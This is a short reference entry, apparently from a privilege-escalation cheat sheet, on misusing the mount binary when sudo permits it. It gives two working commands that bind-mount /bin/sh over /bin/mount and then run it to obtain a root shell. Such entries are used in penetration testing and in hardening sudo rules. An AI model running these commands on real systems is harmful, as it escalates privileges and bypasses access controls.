***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * Exploit the fact that mount can be executed via sudo to replace the mount
      binary with a shell.
      sudo mount -o bind /bin/sh /bin/mount
      sudo mount
